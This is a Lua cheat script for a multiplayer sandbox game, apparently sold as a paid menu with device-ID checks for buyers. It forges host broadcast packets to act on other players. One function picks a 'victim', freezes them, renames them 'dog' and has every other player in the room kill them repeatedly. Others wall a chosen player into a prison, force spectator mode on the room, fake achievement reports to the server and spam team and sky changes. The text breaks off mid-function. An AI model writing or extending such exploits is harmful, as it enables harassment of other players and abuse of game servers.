function pcty12()
    -- Thông báo khởi động thành công
    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")

-- 1. Đóng giao diện menu chính đầu tiên khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)
    
    -- Hộp thoại bật/tắt (Trái: dừng, Phải: bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Tắt",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Bấm nút trái: Tắt
                _G.tdwg_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng lại")
                
            elseif btnType == 1 then
                -- Bấm nút phải: Bật (Reset trạng thái cũ trước)
                _G.tdwg_enabled = false
                
                if _G.tdwg_thread then
                    _G.tdwg_thread = nil
                end
                
                -- Đợi nhẹ để luồng cũ dứt hẳn
                threadpool:wait(0.1)
                
                _G.tdwg_enabled = true
                ShowGameTipsWithoutFilter("#c00ffffĐã bật")
                
                -- Tạo luồng chạy ngầm mới
                _G.tdwg_thread = threadpool:work(function()
                    local a = 0
                    while _G.tdwg_enabled and a < 100000 do
                        a = a + 1
                        
                        xpcall(function()
                            if not (CurWorld and CurMainPlayer and ClientCurGame and ClientCurGame:isInGame()) then
                                return
                            end
                            
                            local myUin = AccountManager:getUin()
                            if not myUin then return end
                            
                            -- Nội dung chữ bạn muốn hiển thị
                            local customTitle = "#cFFAAFF为国#cFFBBEE家赢#cFFCCDD得荣#cFFDDCC誉的#cFFEEBB人           "
                            
                            -- 1. Cấu hình tạo chữ theo code mới của bạn
                            local textDir = { x = 0, y = 30, z = 0 }
                            local textOffset = 10
                            local textX2, textY2 = 0, 0

                            local graphicsInfo = {
                                apha = 1,
                                Type = 1,
                                title = customTitle,
                                autoWrap = 2,
                                itype = 1,
                                fontsize = 100
                            }

                            local tdataText = {
                                [1] = "graphics",
                                [2] = "createGraphicsTxtByActor",
                                [3] = {
                                    myUin, -- Dùng Uin của bạn (hoặc targetUin tùy ý)
                                    graphicsInfo,
                                    textDir,
                                    textOffset,
                                    textX2,
                                    textY2
                                }
                            }
                            
                            -- 2. Cấu hình tạo hình ảnh đi kèm (giữ lại từ code cũ để chạy chung với chữ)
                            local tdataImage = {
                                [1] = "graphics",
                                [2] = "createGraphicsImageByActor",
                                [3] = { myUin, { imgid = 10099, scale = 0.7, apha = 90, id = 1, Type = 'GRAPHICS.GRAPHICS_IMAGE' }, { x = 0, y = 50, z = 0 }, 1, 0, 150 }
                            }
                            
                            -- Gửi lệnh lên server
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataImage)
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataText)
                            
                        end, function(err)
                            print("Lỗi tdwg:", err)
                        end)
                        
                        threadpool:wait(0.1)
                    end
                    
                    print("Vòng lặp tdwg đã kết thúc")
                    _G.tdwg_thread = nil
                end)
            end
        end
    )
end

function pcty13()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt menu đổi team liên tục")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại Bật / Tắt (Trái: Dừng, Phải: Bắt đầu)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Tính năng tự động đổi team liên tục (1 -> 6)!\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- DỪNG VÒNG LẶP
                _G.teamLoopEnabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã dừng vòng lặp đổi team!")
                
            elseif btnType == 1 then
                -- BẮT ĐẦU VÒNG LẶP
                _G.teamLoopEnabled = false
                threadpool:wait(0.1)
                _G.teamLoopEnabled = true

                ShowGameTipsWithoutFilter("#c00ffffĐã BẬT vòng lặp đổi team liên tục (1 - 6)!")

                -- Mở luồng ngầm chạy liên tục
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    if not myUin then return end

                    local teamIds = {1, 2, 3, 4, 5, 6}
                    local teamIndex = 1

                    while _G.teamLoopEnabled do
                        pcall(function()
                            local currentTeamId = teamIds[teamIndex]

                            -- Cấu trúc gói tin đổi team (Tùy thuộc vào phiên bản map, ta dùng cấu trúc player/team chuẩn)
                            local tdata = {
                                [1] = "player",
                                [2] = "setTeam", -- Hoặc thay đổi tùy theo API team của map
                                [3] = { myUin, currentTeamId }
                            }

                            if ScriptSupportTask and SSTASKID then
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end

                            -- Chuyển sang team tiếp theo trong danh sách
                            teamIndex = teamIndex + 1
                            if teamIndex > #teamIds then
                                teamIndex = 1
                            end
                        end)

                        -- Tốc độ chuyển team (0.5 giây / lần, bạn có thể chỉnh nhỏ lại nếu muốn đổi nhanh hơn)
                        threadpool:wait(0.1)
                    end

                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp đổi team đã kết thúc.")
                end)
            end
        end
    )
end

function pcth11()
    -- Đóng bảng chọn nhạc (nếu có)
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    
    -- Hiện bảng 2 nút điều khiển
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Tắt hiệu ứng bầu trời ở bên trái\nBật ở bên phải",  -- Nội dung hiển thị
        "Dừng",        -- Tiêu đề
        nil,                  -- Icon
        function(userData, btnType)
            if btnType == 0 then  -- Nút Trái: Dừng hiệu ứng
                -- ===== DỪNG HIỆU ỨNG =====
                _G.skybox_dual_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000Đã tắt hiệu ứng Skybox!")
                
                -- Khôi phục lại trạng thái mặc định sau 0.5 giây
                threadpool:work(function()
                    threadpool:wait(0.5)
                    if not _G.skybox_dual_enabled then
                        local tdata = {
                            [1] = "world",
                            [2] = "SetSkyBoxMaps",
                            [3] = {0, 0, ""}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục mặc định")
                    end
                end)
                
            elseif btnType == 1 then  -- Nút Phải: Bật hiệu ứng song song
                -- ===== BẬT HIỆU ỨNG SONG SONG (TEMPLATE + MAPS) =====
                -- Nếu đang chạy rồi thì không bật chồng thread
                if _G.skybox_dual_enabled then return end
                
                _G.skybox_dual_enabled = true
                ShowGameTipsWithoutFilter("#c00ffffĐã bật Skybox Song Song (Template + Maps)!")
                
                threadpool:work(function()
                    -- Danh sách ID Template (2 tới 9)
                    local templateIds = {2, 3, 4, 5, 6, 7, 8, 9}
                    -- Danh sách ID Skybox Maps (30001 tới 30012)
                    local skyboxIds = {30001, 30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010, 30011, 30012}
                    
                    local tIndex = 1
                    local mIndex = 1
                    
                    while _G.skybox_dual_enabled do
                        -- 1. Gói lệnh đổi Template
                        local tdataTemplate = {
                            [1] = "world",
                            [2] = "SetSkyBoxTemplate",
                            [3] = { templateIds[tIndex] }
                        }
                        
                        -- 2. Gói lệnh đổi Skybox Maps
                        local tdataMaps = {
                            [1] = "world",
                            [2] = "SetSkyBoxMaps",
                            [3] = { 1, skyboxIds[mIndex], "" }
                        }
                        
                        -- Gửi đồng thời cả 2 lệnh lên host
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataTemplate)
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataMaps)
                        end)
                        
                        -- Tăng index Template
                        tIndex = tIndex + 1
                        if tIndex > #templateIds then tIndex = 1 end
                        
                        -- Tăng index Maps
                        mIndex = mIndex + 1
                        if mIndex > #skyboxIds then mIndex = 1 end
                        
                        -- Tốc độ chạy (0.001 giây hoặc bạn có thể chỉnh tăng lên nếu quá nhanh)
                        threadpool:wait(0.001)
                    end
                end)
            end
        end
    )
end

function pcth100()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    if not ClientCurGame or not ClientCurGame:isInGame() then
        ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng trò chơi trước")
        return
    end

    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()

    if #uin_list < 1 then
        ShowGameTipsWithoutFilter("#cFF0000Phòng không có người chơi nào khác!")
        return
    end

    -- Khởi tạo danh sách trắng toàn cục nếu chưa có
    if whitelist == nil then
        whitelist = {}
    end

    local myUin = AccountManager:getUin()

    -- ========================================================
    -- MỞ BẢNG CHỌN NẠN NHÂN (Mục tiêu bị đánh hội đồng)
    -- ========================================================
    local data1 = {
        visit = {
            history_num = "Chọn Nạn Nhân",
            today_num = "#cFF7aad Tổng số: " .. #uin_list
        },
        event_home = {{param1 = 0, event_id = 5, event_time = 0}},
        event_visit = {}
    }
    for i = 1, #uin_list do
        data1.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
    end

    GetInst("UIManager"):Open("HomeEventRecord")
    GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data1)
    getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要被围殴的目标（受害者）")
    getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách phòng")
    getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn chọn nạn nhân")

    local ctrl1 = GetInst("UIManager"):GetCtrl("HomeEventRecord")
    local oldClick1 = ctrl1.EnterFriendHomeBtn_OnClick

    function ctrl1:EnterFriendHomeBtn_OnClick()
        GetInst("UIManager"):Close("HomeEventRecord")
        ctrl1.EnterFriendHomeBtn_OnClick = oldClick1

        local targetUin = this:GetClientID()

        -- Kiểm tra whitelist cho nạn nhân
        if whitelist[targetUin] or targetUin == myUin then
            ShowGameTipsWithoutFilter("#cFF0000Không thể chọn bản thân hoặc người trong danh sách trắng làm nạn nhân!")
            return
        end

        ShowGameTipsWithoutFilter("#c00ffffĐã chọn Nạn Nhân: " .. targetUin .. " - Bắt đầu đánh hội đồng!")

        -- Bật cờ chạy vòng lặp
        _G.mobKill_enabled = true

        -- ========================================================
        -- VÒNG LẶP ÉP TẤT CẢ NGƯỜI CHƠI TRONG PHÒNG RA TAY TIÊU DIỆT NẠN NHÂN
        -- ========================================================
        threadpool:work(function()
            local loopCount = 0

            while _G.mobKill_enabled do
                loopCount = loopCount + 1

                pcall(function()
                    -- 1. Khóa di chuyển/hành động của nạn nhân
                    if loopCount % 10 == 1 then
                        local keepDisable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = { targetUin, 32, false }
                        }
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                    end

                    -- 2. Mở rương (797 và 798), đổi tên nạn nhân thành chó
                    local disableAttack1 = { [1] = "player", [2] = "forceOpenBoxUI", [3] = { targetUin, 797 } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)

                    local disableAttack2 = { [1] = "player", [2] = "forceOpenBoxUI", [3] = { targetUin, 798 } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack2)

                    local setNick = { [1] = "actor", [2] = "setnickname", [3] = { targetUin, '#R狗' } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)

                    local changeModel = { [1] = "actor", [2] = "changeCustomModel", [3] = { targetUin, [=[mob_3407]=] } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)

                    -- 3. Xóa buff bất tử của nạn nhân
                    local clearBuff = { [1] = "buff", [2] = "clearAllBuff", [3] = { targetUin } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)

                    -- 4. Hiệu ứng la-de, búa sét
                    local t1 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = { targetUin, "jiguang01", true } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1)

                    local t10 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = { targetUin, "aotu_06_leishenzhichui", true } }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10)

                    -- 5. QUÉT TOÀN BỘ NGƯỜI CHƠI TRONG PHÒNG ĐỂ LÀM "ĐAO PHỦ"
                    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                    for i = 1, size do
                        local attackerPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                        if attackerPlayer then
                            local attackerUin = attackerPlayer:getUin()
                            
                            -- Đao phủ phải KHÁC bản thân VÀ KHÁC nạn nhân VÀ KHÔNG nằm trong whitelist
                            if attackerUin ~= myUin and attackerUin ~= targetUin and not whitelist[attackerUin] then
                                
                                -- Cấp quyền tấn công (lệnh 64) cho từng người chơi
                                local grantPower = {
                                    [1] = "player",
                                    [2] = "setActionAttrState",
                                    [3] = { attackerUin, 64, true }
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, grantPower)

                                -- Ép người chơi đó ra đòn chí mạng tiêu diệt nạn nhân
                                local mobHurt = {
                                    [1] = "actor",
                                    [2] = "playerHurt",
                                    [3] = { attackerUin, targetUin, 1.8e+308, 0 }
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, mobHurt)
                            end
                        end
                    end
                end)

                if loopCount % 10 == 0 then
                    ShowGameTipsWithoutFilter("#c00ffffĐang đánh hội đồng lần thứ " .. loopCount)
                end

                threadpool:wait(0.1)
            end

            -- Khôi phục trạng thái cho nạn nhân sau khi dừng
            local enableAttack = { [1] = "player", [2] = "setActionAttrState", [3] = { targetUin, 32, true } }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
            end)

            ShowGameTipsWithoutFilter("#cFF0000Đã dừng tính năng đánh hội đồng!")
        end)
    end
end

function pcth2()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra quyền hạn thiết bị
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua sử dụng", 3)
        return
    end

    -- Đóng giao diện menu khi ấn
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- BẢNG 1: Nhập kích thước (Size) cho nhà tù
    ShowGameTipsWithoutFilter("Vui lòng nhập: Kích thước nhà tù (Ví dụ: 15)")
    ShowTextInputSafe(function(sizeText)
        if not sizeText or sizeText == "" then
            ShowGameTipsWithoutFilter("Vui lòng nhập kích thước hợp lệ")
            return
        end

        local prisonSize = tonumber(sizeText)
        if not prisonSize or prisonSize < 5 then
            ShowGameTipsWithoutFilter("Kích thước phải là một số lớn hơn hoặc bằng 5")
            return
        end

        local height = 8

        -- BẢNG 2: Nhập ID khối vật liệu cho nhà tù và hình cầu
        ShowTextInputSafe(function(blockIdText)
            if not blockIdText or blockIdText == "" then
                ShowGameTipsWithoutFilter("Vui lòng nhập ID khối hợp lệ")
                return
            end

            local blockId = tonumber(blockIdText)
            if not blockId then
                ShowGameTipsWithoutFilter("ID khối phải là một con số")
                return
            end

            -- BẢNG 3: Chọn người chơi để tạo nhà tù tại vị trí của họ
            ShowPlayerList(function(selectedUin)
                if not selectedUin then
                    ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                    return
                end

                -- Kiểm tra danh sách VIP / whitelist nếu có
                if whitelist and whitelist[selectedUin] then
                    ShowGameTipsWithoutFilter("#RKhông thể áp dụng tính năng này lên thành viên VIP!", 3)
                    return
                end

                -- BẢNG 4: Hộp thoại xác nhận
                GetInst("MessageBoxInterface"):dualBtnBox(
                    "Xác nhận tạo nhà tù (ID: " .. blockId .. ") kích thước " .. prisonSize .. "x" .. height .. "x" .. prisonSize .. " kèm lớp hình cầu bao quanh mục tiêu?",
                    "Đồng ý",
                    "Hủy",
                    function(result)
                        if result == 0 or result == false or result == "Hủy" then
                            ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác tạo nhà tù!")
                            return
                        end

                        local targetPlayerObj = nil
                        pcall(function()
                            if ClientCurGame and ClientCurGame:requireArrayOfAllPlayers() then
                                local playerCount = ClientCurGame:requireArrayOfAllPlayers()
                                for i = 1, playerCount do
                                    local p = ClientCurGame:getIthPlayerInArray(i - 1)
                                    if p and p:getUin() == selectedUin then
                                        targetPlayerObj = p
                                        break
                                    end
                                end
                            end
                        end)

                        if not targetPlayerObj or not targetPlayerObj.getPosition then
                            ShowGameTipsWithoutFilter("#cFF0000Không tìm thấy tọa độ của người chơi này!")
                            return
                        end

                        local x, y, z = targetPlayerObj:getPosition(0, 0, 0)
                        local base_x, base_y, base_z = math.floor(x / 100), math.floor(y / 100), math.floor(z / 100)

                        local half_size = math.floor(prisonSize / 2)
                        local start_x = base_x - half_size
                        local start_y = base_y - 1  
                        local start_z = base_z - half_size

                        ShowGameTipsWithoutFilter("#c00ff00Đang tạo nhà tù hở nóc và lớp cầu bảo vệ...")

                        threadpool:work(function()
                            -- 1. Tạo 4 bức tường xung quanh và sàn nhà tù (ĐÃ CỐ ĐỊNH HOÀN TOÀN KHÔNG CÓ NÓC)
                            for dx = 0, prisonSize - 1 do
                                for dy = 0, height - 1 do
                                    for dz = 0, prisonSize - 1 do
                                        -- Chỉ lấy viền tường (dx, dz ở rìa) hoặc sàn ở dưới cùng (dy == 0)
                                        local isWall = (dx == 0 or dx == prisonSize - 1 or  
                                                        dz == 0 or dz == prisonSize - 1 or  
                                                        dy == 0)                           

                                        -- Đảm bảo dy < height - 1 để bỏ hoàn toàn lớp trần ở trên cùng
                                        if isWall and dy < height - 1 then  
                                            local current_x = start_x + dx
                                            local current_y = start_y + dy
                                            local current_z = start_z + dz

                                            local tdata = {
                                                [1] = "block",
                                                [2] = "placeBlock",
                                                [3] = { blockId, current_x, current_y, current_z, 0, -1 }
                                            }
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end
                                    end
                                end
                            end

                            -- 2. Tạo thêm 1 lớp hình cầu bao bọc bên ngoài nhà tù
                            local center_sphere_x = base_x
                            local center_sphere_y = base_y + math.floor(height / 2) - 1
                            local center_sphere_z = base_z
                            local radius = half_size + 2  
                            local thickness = 1            

                            for sx = -radius, radius do
                                for sy = -radius, radius do
                                    for sz = -radius, radius do
                                        local distance = math.sqrt(sx*sx + sy*sy + sz*sz)
                                        if distance <= radius and distance >= (radius - thickness) then
                                            local sphere_x = center_sphere_x + sx
                                            local sphere_y = center_sphere_y + sy
                                            local sphere_z = center_sphere_z + sz

                                            local sphere_data = {
                                                [1] = "block",
                                                [2] = "placeBlock",
                                                [3] = { blockId, sphere_x, sphere_y, sphere_z, 0, -1 }
                                            }
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, sphere_data)
                                        end
                                    end
                                end
                            end

                            ShowGameTipsWithoutFilter("#c00ffffTạo nhà tù không nóc kèm lớp cầu bảo vệ thành công!")
                        end)
                    end
                )
            end, "Chọn người chơi để giam giữ")
        end, "Nhập ID khối vật liệu (Ví dụ: 1)")
    end)
end

function pcth3()
    -- Lấy đối tượng người chơi chính của bản thân
    local mainPlayer = CurMainPlayer or Player:getHero()

    if mainPlayer then
        -- Lấy UIN chính chủ của bản thân làm mục tiêu
        local myUin = AccountManager:getUin()

        -- Thực thi đúng 2 dòng lệnh yêu cầu
        mainPlayer:setUin(myUin)             -- Đổi UID mục tiêu quan chiến
        mainPlayer:setSpectatorMode(1)   -- Bật chế độ quan chiến

        -- Gửi thông báo xác nhận thành công
        local msgTarget = (event and event.eventobjid) or myUin
        Chat:sendSystemMsg(msgTarget, "Đã kích hoạt chế độ quan chiến cho bản thân!")
    else
        local msgTarget = (event and event.eventobjid) or AccountManager:getUin()
        Chat:sendSystemMsg(msgTarget, "Không tìm thấy đối tượng người chơi (CurMainPlayer)!")
    end
end

function pcth4()
    -- Lấy đối tượng người chơi chính của bản thân
    local mainPlayer = CurMainPlayer or Player:getHero()

    if mainPlayer then
        -- Lấy UID chính chủ của bản thân
        local myUin = AccountManager:getUin()

        -- Chạy chuỗi lệnh khôi phục trạng thái bình thường
        mainPlayer:setUin(myUin)             -- 1. Đổi UID về chính chủ
        mainPlayer:setSpectatorMode(0)      -- 2. Tắt chế độ quan chiến, trở về chơi bình thường

        -- Gửi thông báo xác nhận thành công
        local msgTarget = (event and event.eventobjid) or myUin
        Chat:sendSystemMsg(msgTarget, "Đã khôi phục trạng thái chơi bình thường!")
    else
        local msgTarget = (event and event.eventobjid) or AccountManager:getUin()
        Chat:sendSystemMsg(msgTarget, "Không tìm thấy đối tượng người chơi (CurMainPlayer)!")
    end
end

function pcth5()
    -- Sử dụng ShowTextInputSafe để mở bảng nhập số
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống!")
            return
        end

        local num = tonumber(text)
        
        -- Kiểm tra xem giá trị nhập vào có phải từ 1 đến 10 không
        if not num or num < 1 or num > 10 then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng nhập số hợp lệ từ 1 đến 10!")
            return
        end

        -- Tạo tên file nhạc động (music.bgm1 đến music.bgm10)
        local soundName = "music.bgm" .. tostring(num)
        ShowGameTipsWithoutFilter("#c00ffffĐang phát: " .. soundName) -- (Hoặc dấu .. nếu Lua chuẩn)

        -- 1. Phát hiệu ứng âm thanh tương ứng tại vị trí nhân vật
        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
        local new_x = x / 100
        local new_y = y / 100
        local new_z = z / 100
        CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, soundName, 5, 1, 0, new_x, new_y, new_z, 0, 1, 100)

        -- 2. Gửi báo cáo dữ liệu thành tựu lên máy chủ
        local Rxz = {1001, 1002, 1003, 1004, 1005, 1006, 1008, 1010, 1011, 1012, 1014, 1015, 1017, 1018, 1019, 1020}

        for index, achievementId in ipairs(Rxz) do
            pcall(function()
                ArchievementGetInstance().func:Report2Server(achievementId, {pos = 838384, add = 2001, count = 2001})
            end)
        end

        ShowGameTipsWithoutFilter("#c00ff00Đã hoàn tất phát nhạc và gửi thành tựu!")
    end)
end

function pcth6()
    -- 1. Kiểm tra và khởi tạo danh sách trắng (nếu chưa có)
    if whitelist == nil then
        whitelist = {}
    end

    -- Lấy UIN của chính mình để loại trừ
    local myUin = AccountManager:getUin()
    whitelist[myUin] = true -- Tự động đưa bản thân vào danh sách trắng

    -- Lấy đối tượng người chơi chính của bản thân
    local mainPlayer = CurMainPlayer or Player:getHero()

    local msgTarget = myUin
    if event and event.eventobjid then
        msgTarget = event.eventobjid
    end

    if not mainPlayer then
        Chat:sendSystemMsg(msgTarget, "Không tìm thấy đối tượng người chơi (CurMainPlayer)!")
        return
    end

    -- 2. Tự động quét toàn bộ người chơi trong phòng thông qua BriefInfo
    local num = ClientCurGame:getNumPlayerBriefInfo()
    local affectedCount = 0

    for i = 1, num do
        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
        if briefInfo and briefInfo.uin then
            local uin = briefInfo.uin
            
            -- Kiểm tra xem UIN này có nằm trong danh sách trắng hay không
            if not whitelist[uin] then
                -- Tác động lên từng người chơi ngoài danh sách trắng
                pcall(function()
                    mainPlayer:setUin(uin)
                    mainPlayer:setSpectatorMode(1)
                end)
                
                affectedCount = affectedCount + 1
            end
        end
    end

    -- 3. Gửi thông báo kết quả qua kênh hệ thống
    Chat:sendSystemMsg(msgTarget, "Đã tự động tác động lên " .. tostring(affectedCount) .. " người chơi (đã loại trừ danh sách trắng)!")
end

function pcth7()
    -- 1. Kiểm tra và khởi tạo danh sách trắng (nếu chưa có)
    if whitelist == nil then
        whitelist = {}
    end

    -- Lấy UIN của chính mình
    local myUin = AccountManager:getUin()
    whitelist[myUin] = true -- Đảm bảo luôn loại trừ bản thân

    -- Lấy đối tượng người chơi chính của bản thân
    local mainPlayer = CurMainPlayer or Player:getHero()

    local msgTarget = myUin
    if event and event.eventobjid then
        msgTarget = event.eventobjid
    end

    if not mainPlayer then
        Chat:sendSystemMsg(msgTarget, "Không tìm thấy đối tượng người chơi (CurMainPlayer)!")
        return
    end

    -- 2. Tự động quét toàn bộ người chơi trong phòng để khôi phục trạng thái
    local num = ClientCurGame:getNumPlayerBriefInfo()
    local restoredCount = 0

    for i = 1, num do
        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
        if briefInfo and briefInfo.uin then
            local uin = briefInfo.uin
            
            -- Kiểm tra xem UIN này có nằm trong danh sách trắng hay không
            if not whitelist[uin] then
                -- Khôi phục: Đặt lại UID về chính chủ và tắt chế độ quan chiến
                pcall(function()
                    mainPlayer:setUin(myUin)
                    mainPlayer:setSpectatorMode(0)
                end)
                
                restoredCount = restoredCount + 1
            end
        end
    end

    -- 3. Gửi thông báo kết quả
    Chat:sendSystemMsg(msgTarget, "Đã tự động khôi phục trạng thái bình thường cho " .. tostring(restoredCount) .. " người chơi!")
end

function pcth8()
    -- Đóng giao diện bảng nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- 1. Gửi lệnh đổi bộ lọc bầu trời
    local tdata1 = {
        [1] = "world",
        [2] = "SetSkyBoxFilter",
        [3] = {0, 10, 1} 
    }
    pcall(function()
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
    end)

    -- 2. Gửi lệnh đổi mẫu bầu trời (Template)
    local tdata2 = {
        [1] = "world",
        [2] = "SetSkyBoxTemplate",
        [3] = {1} 
    }
    pcall(function()
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end)

    -- Thông báo thành công trên màn hình game
    ShowGameTipsWithoutFilter("#c00ff00Đã kích hoạt bầu trời thành công!")
end

function pcth9()
    -- Đóng giao diện bảng nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Mở bảng nhập số (Input Box)
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống ID bầu trời!")
            return
        end

        local templateId = tonumber(text)
        if not templateId then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng nhập một con số hợp lệ!")
            return
        end

        -- Gửi lệnh thay đổi bầu trời với ID do bạn vừa nhập
        local tdata = {
            [1] = "world",
            [2] = "SetSkyBoxTemplate",
            [3] = { templateId }
        }

        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            ShowGameTipsWithoutFilter("#c00ff00Đã đổi mẫu bầu trời thành công (ID: " .. templateId .. ")!")
        end)
    end, "Nhập ID mẫu bầu trời (Ví dụ: 1, 2, 3...)")
end

function pcth10()
    -- Đóng giao diện bảng nếu đang mở
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Bước 1: Mở bảng nhập số
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống!")
            return
        end

        -- Tách chuỗi người dùng nhập dựa vào dấu phẩy (ví dụ: "0, 10, 1")
        local nums = {}
        for val in text:gmatch("[^,%s]+") do
            table.insert(nums, tonumber(val))
        end

        if #nums < 3 then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng nhập đủ 3 số cách nhau bởi dấu phẩy (VD: 0,10,1)")
            return
        end

        local p1, p2, p3 = nums[1], nums[2], nums[3]

        -- Bước 2: Hiện bảng xác nhận (Yes / No) với các số liệu vừa nhập
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Xác nhận gửi thông số bộ lọc bầu trời:\n- Số 1: " .. tostring(p1) .. "\n- Số 2: " .. tostring(p2) .. "\n- Số 3: " .. tostring(p3),
            "Hủy",     -- Nút trái (btnType == 0) -> Không làm gì
            "Đồng ý",  -- Nút phải (btnType == 1) -> Tiến hành gửi lệnh
            function(userData, btnType)
                if btnType == 1 then
                    -- Người dùng bấm Đồng ý
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxFilter",
                        [3] = { p1, p2, p3 }
                    }

                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        ShowGameTipsWithoutFilter("#c00ff00Đã gửi lệnh Lọc màu Sky: " .. p1 .. ", " .. p2 .. ", " .. p3)
                    end)
                else
                    -- Người dùng bấm Hủy
                    ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác!")
                end
            end
        )

    end, "Nhập 3 thông số (VD: 0,10,1)")
end

function pcyh1()
    -- Đóng giao diện menu hiện tại khi bấm
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Hiển thị thông báo hướng dẫn trước khi bật bảng nhập
    ShowGameTipsWithoutFilter("Nhập giá trị: 0 (Cấm vào giữa chừng) hoặc 1 (Cho phép vào)")

    -- Bật bảng nhập văn bản
    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống!")
            return
        end

        local value = tonumber(text)
        -- Kiểm tra xem giá trị nhập vào có phải số 0 hoặc 1 không
        if value ~= 0 and value ~= 1 then
            ShowGameTipsWithoutFilter("#cFF0000Hãy nhập chính xác số 0 hoặc 1!")
            return
        end

